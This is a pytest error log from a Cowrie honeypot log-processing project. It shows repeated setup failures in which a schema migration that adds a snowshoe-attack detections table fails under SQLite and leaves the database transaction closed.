ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_ ERROR at setup of TestFileEnrichmentFlow.test_session_summary_file_count_integration _

test_db_path = 'sqlite:////tmp/pytest-of-speterson/pytest-33/test_session_summary_file_coun0/test.db'

    @pytest.fixture
    def engine(test_db_path):
        """Create database engine for testing."""
        engine = create_engine_from_settings(load_database_settings())
        # Override with test database path
        from sqlalchemy import create_engine
    
        engine = create_engine(test_db_path)
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_files_enrichment_flow.py:30: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b26ba5f0>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:39:51,428:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:39:51,431:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:39:51,440:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:39:51,441:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:39:51,442:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:39:51,445:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:39:51,447:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:39:51,448:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:39:51,450:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:39:51,451:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:39:51,453:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:39:51,454:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:39:51,457:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:39:51,458:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:51,459:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:51,460:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:51,460:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:51,461:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:51,461:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:51,463:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
______ ERROR at setup of TestFileEnrichmentFlow.test_files_table_indexes _______

test_db_path = 'sqlite:////tmp/pytest-of-speterson/pytest-33/test_files_table_indexes0/test.db'

    @pytest.fixture
    def engine(test_db_path):
        """Create database engine for testing."""
        engine = create_engine_from_settings(load_database_settings())
        # Override with test database path
        from sqlalchemy import create_engine
    
        engine = create_engine(test_db_path)
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_files_enrichment_flow.py:30: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b2759d30>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:39:54,548:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:39:54,549:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:39:54,557:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:39:54,559:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:39:54,560:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:39:54,562:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:39:54,563:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:39:54,567:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:39:54,568:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:39:54,569:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:39:54,571:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:39:54,574:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:39:54,575:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:39:54,576:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:54,577:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:54,577:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:54,578:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:54,578:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:54,579:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:54,579:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
___ ERROR at setup of TestLongtailStorage.test_store_longtail_analysis_basic ___

    @pytest.fixture
    def temp_db():
        """Create a temporary SQLite database for testing."""
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
            db_path = f.name
    
        engine = create_engine(f"sqlite:///{db_path}")
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_longtail_storage.py:37: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b30afd90>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:39:58,074:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:39:58,076:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:39:58,083:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:39:58,085:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:39:58,086:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:39:58,088:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:39:58,090:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:39:58,091:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:39:58,092:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:39:58,093:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:39:58,096:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:39:58,097:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:39:58,098:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:39:58,099:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:58,100:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:58,103:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:58,103:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:58,103:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:58,104:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:58,104:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
